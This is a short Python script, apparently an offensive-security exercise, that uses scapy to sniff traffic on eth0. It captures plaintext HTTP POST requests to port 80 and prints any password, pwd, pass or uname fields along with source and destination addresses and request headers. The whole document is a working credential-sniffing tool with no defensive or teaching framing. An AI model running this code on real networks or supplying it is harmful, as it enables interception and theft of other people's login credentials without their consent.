from scapy.all import TCP, IP, sniff, threading, Raw
from datetime import datetime
import re
offsec = "eth0" 

def chest(p):
    reg = [
        r'(?i)password=[^&;\n]*', 
        r'(?i)pwd=[^&;\n]*',       
        r'(?i)pass=[^&;\n]*',
        r'(?i)passw=[^&;\n]*',      
        r'(?i)uname=[^&;\n]*'
    ]
    for pattern in reg:
        matches = re.findall(pattern, p)
        if matches:
            return matches
    return None

def test(pkt):
    try:
        t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if IP in pkt and TCP in pkt:
            s = pkt[IP].src
            d = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            if dport == 80:
                if Raw in pkt:
                    p = pkt[Raw].load.decode('utf-8', errors='ignore')
                    methods = ['POST']
                    if any(p.startswith(method) for method in methods):
                        lines = p.split('\r\n')
                        if lines:
                            req = lines[0]
                            headers = [line for line in lines[1:] if line and ': ' in line] 
                            bd = p.find('\r\n\r\n') + 4
                            body = p[bd:] if bd < len(p) else ""
                            passwords = chest(p) 
                            if passwords:
                                print(t)
                                print(f"Request from {s}:{sport} To {d}:{dport}")
                                print(req)
                                if headers:
                                    for header in headers:
                                        print(f"{header}")
                                if body:
                                    print(f"Password found: {body}")
                                for pwd in passwords:
                                    print(f"{pwd}") 
                                else:
                                    pass                
                                print('^' * 30)                            
    except Exception as e:
        print(f"Error {e}")
                             
def best():
    print(f"Capturing packets running")
    try:
        sniff(iface=offsec, prn=lambda pkt: threading.Thread(target=test, args=(pkt,), daemon=True).start(), store=0)
    except KeyboardInterrupt:
        print(f"script Stopped")
    except Exception as e:
        print(f"Error: {e}")
best()                      